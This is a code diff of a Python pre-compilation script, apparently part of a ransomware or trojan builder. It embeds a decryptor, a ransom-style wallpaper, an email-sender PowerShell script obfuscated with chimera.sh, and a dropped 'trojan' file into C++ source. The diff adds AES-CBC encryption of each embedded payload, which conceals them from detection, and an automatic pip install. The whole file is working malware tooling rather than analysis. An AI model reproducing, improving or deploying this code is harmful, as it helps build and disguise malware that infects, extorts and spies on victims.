@@ -1,7 +1,20 @@
-import base64, sys, os, platform
-sys.setrecursionlimit(1000000)      # for bigger files
+import base64, sys, os, platform, subprocess, importlib
+sys.setrecursionlimit(2147483647)      # for bigger files
+
+try:
+    importlib.import_module("Cryptodome")
+except ImportError:
+    subprocess.run(["pip", "install", "pycryptodome"])
+try:
+    from Cryptodome.Cipher import AES
+    from Cryptodome.Util.Padding import pad
+except ImportError:
+    print(f'preComp.py: library "pycryptodome" not installed')
+    exit()
 
 emailSenderLastPath = ''
+key = ''
+iv = ''
 FAST_TEST = False
 CUSTOM_FILE = False
 DROPRUN_TROJAN = False
@@ -14,7 +27,10 @@ for line in open('../commons/common.h', 'r').readlines():
         CUSTOM_FILE = True
     if '#define DROPRUN_TROJAN_FILE' in line and 'true' in line:
         DROPRUN_TROJAN = True
-
+    if '#define IV' in line:
+        iv = line.split('"')[1].encode()
+    if '#define KEY' in line and '#define KEYOFKEY' not in line:
+        key = line.split('"')[1].encode()
 
 def split_str(seq, chunk, skip_tail=False):
     lst = []
@@ -24,7 +40,6 @@ def split_str(seq, chunk, skip_tail=False):
     elif not skip_tail and seq:
         lst.extend([seq])
     return lst
-
 
 
 def encryptString(string):
@@ -78,7 +93,8 @@ def getEmailSenderCryptedAndEncoded(filePath):
             os.system(f'start /wait "" "%SYSTEMDRIVE%\\Program Files (x86)\\Git\\bin\\sh.exe" --login -i -c "./chimera.sh -f ./emailSenderReal.ps1 -o chimera.ps1 -l 5 -v -t -c -i -h -s -b -j -g -k -p -d"')
     os.remove('emailSenderReal.ps1')
 
-    returner = base64.b64encode(open('chimera.ps1', 'rb').read()).decode()
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    returner = base64.b64encode(cipher.encrypt(pad(open('chimera.ps1', 'rb').read(), AES.block_size))).decode()
     if not FAST_TEST:
         os.remove('chimera.ps1')
     return returner
@@ -87,6 +103,7 @@ def getEmailSenderCryptedAndEncoded(filePath):
 def checkFileLocation(file, iLine):
     if not os.path.exists(file):
         print(f'main.cpp {iLine}: error PreComp: file "{file}" not found')
+        exit()
 
 
 
@@ -96,25 +113,34 @@ content = ""
 i = 0
 for line in main_cppRead.readlines():
     i += 1
+    #print(line, end='')
 
-    if line.split('=')[0] == 'string InfoDecryptorContent ' and line.split('=')[1] != ' \n':
-        content += 'string InfoDecryptorContent = \n'
+    if line.split('=')[0] == 'string DataDecryptorContent ' and line.split('=')[1] != ' \n':
+        content += 'string DataDecryptorContent = \n'
         decryptorPath = line.split('"')[1]
-        decryptorContent = base64.b64encode(open(decryptorPath, 'rb').read()).decode()
+
+        cipher = AES.new(key, AES.MODE_CBC, iv)
+        decryptorContent = base64.b64encode(cipher.encrypt(pad(base64.b64encode(open(decryptorPath, 'rb').read()), AES.block_size))).decode()
+        #print(f'{key} : {iv}\n{decryptorContent}\n')
+        #exit()
+
         open('preCompilation.tmp', 'a').write("decryptor=" + decryptorPath + "\n")
-        for subContent in split_str(decryptorContent, 500, False):
+        for subContent in split_str(decryptorContent, 1000, False):
             content += '"'+subContent+'"\n'
         content += ';\n'
         continue
+
     if line.split('=')[0] == 'string WallpaperContent ' and line.split('=')[1] != ' \n':
         content += 'string WallpaperContent = \n'
         wallpaperPath = line.split('"')[1]
-        wallpaperContent = base64.b64encode(open(wallpaperPath, 'rb').read()).decode()
+        cipher = AES.new(key, AES.MODE_CBC, iv)
+        wallpaperContent = base64.b64encode(cipher.encrypt(pad(open(wallpaperPath, 'rb').read(), AES.block_size))).decode()
         open('preCompilation.tmp', 'a').write("wallpaper=" + wallpaperPath + "\n")
         for subContent in split_str(wallpaperContent, 500, False):
             content += '"'+subContent+'"\n'
         content += ';\n'
         continue
+
     if line.split('=')[0] == 'string EmailSenderContent ' and line.split('=')[1] != ' \n':
         content += 'string EmailSenderContent = \n'
         emailSenderPath = line.split('"')[1]
@@ -124,39 +150,46 @@ for line in main_cppRead.readlines():
             content += '"'+subContent+'"\n'
         content += ';\n'
         continue
+
     if line.split('=')[0] == 'string FileIconContent ' and line.split('=')[1] != ' \n':
         content += 'string FileIconContent = \n'
         fileIconPath = line.split('"')[1]
-        fileIconContent = base64.b64encode(open(fileIconPath, 'rb').read()).decode()
+        cipher = AES.new(key, AES.MODE_CBC, iv)
+        fileIconContent = base64.b64encode(cipher.encrypt(pad(open(fileIconPath, 'rb').read(), AES.block_size))).decode()
         open('preCompilation.tmp', 'a').write("fileicon=" + fileIconPath + "\n")
         for subContent in split_str(fileIconContent, 500, False):
             content += '"'+subContent+'"\n'
         content += ';\n'
         continue
+
     if line.split('=')[0] == 'string CustomFileContent ' and line.split('=')[1] != ' \n':
         content += 'string CustomFileContent = \n'
         customFilePath = line.split('"')[1]
         customFileContent = base64.b64encode('nothing to read here :) - Tuga'.encode()).decode()
         if CUSTOM_FILE:
             checkFileLocation(customFilePath, i)
-            customFileContent = base64.b64encode(open(customFilePath, 'rb').read()).decode()
+            cipher = AES.new(key, AES.MODE_CBC, iv)
+            customFileContent = base64.b64encode(cipher.encrypt(pad(open(customFilePath, 'rb').read(), AES.block_size))).decode()
         open('preCompilation.tmp', 'a').write("customfile=" + customFilePath + "\n")
         for subContent in split_str(customFileContent, 500, False):
             content += '"'+subContent+'"\n'
         content += ';\n'
         continue
+
     if line.split('=')[0] == 'string TrojanFileContent ' and line.split('=')[1] != ' \n':
         content += 'string TrojanFileContent = \n'
         trojanFilePath = line.split('"')[1]
         trojanFileContent = base64.b64encode('nothing to read here :) - Tuga'.encode()).decode()
         if DROPRUN_TROJAN:
             checkFileLocation(trojanFilePath, i)
-            trojanFileContent = base64.b64encode(open(trojanFilePath, 'rb').read()).decode()
+            cipher = AES.new(key, AES.MODE_CBC, iv)
+            trojanFileContent = base64.b64encode(cipher.encrypt(pad(open(trojanFilePath, 'rb').read(), AES.block_size))).decode()
         open('preCompilation.tmp', 'a').write("trojanfile=" + trojanFilePath + "\n")
         for subContent in split_str(trojanFileContent, 500, False):
             content += '"'+subContent+'"\n'
         content += ';\n'
         continue
+
     content += line
 
 main_cppRead.close()
